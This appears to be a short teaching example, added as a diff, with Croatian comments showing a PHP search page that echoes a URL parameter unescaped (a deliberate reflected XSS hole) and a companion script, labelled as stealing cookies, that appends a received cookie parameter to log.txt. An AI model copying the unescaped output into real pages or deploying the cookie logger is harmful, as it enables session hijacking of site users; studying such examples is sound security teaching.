@@ -1,0 +1,23 @@
+//Primjer ranjive web stranice preko koje će se izvršiti zlonamjerna skripta
+//URL stranice:http://www.nas_posluzitelj.com/pojam.php 
+
+<HTML>
+<BODY>
+//ispis na stranici
+Traženi pojam
+<?php
+echo $_GET['pojam']; //neprovjereni i nekodirani ispis traženog pojma
+?>
+ nije pronađen.
+ 
+ 
+ //php skripta kojom krademo kolačiće
+ 
+ <?php
+$cookies = $_GET["c"];
+$file = fopen('log.txt', 'a');
+fwrite($file, $cookies . "\n\n");
+?>
+
+</BODY>
+</HTML> 
